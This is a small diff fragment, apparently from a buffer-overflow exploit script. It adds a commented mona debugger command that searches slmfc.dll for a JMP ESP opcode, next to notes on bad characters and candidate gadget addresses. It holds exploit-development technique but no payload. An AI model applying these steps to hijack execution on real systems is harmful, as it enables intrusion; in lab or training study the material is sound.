@@ -45,6 +45,7 @@ def main():
 	# !mona modules
 	# !mona jmp -r esp -cpb "\x00\x0a\x0d"  --> 080416BF, 080414C3  (little endian)
 	# !mona jmp -r esp 
+	# !mona find -s "\xff\xe4" -m slmfc.dll
 	# !mona findwild -m kernel32.dll -s "jmp esp" -cpb "\x00\x0a\x0d"
 	# gadget JMP ESP @
 	# E.G: 080416BF, 080414C3, 758E3132, 75943165
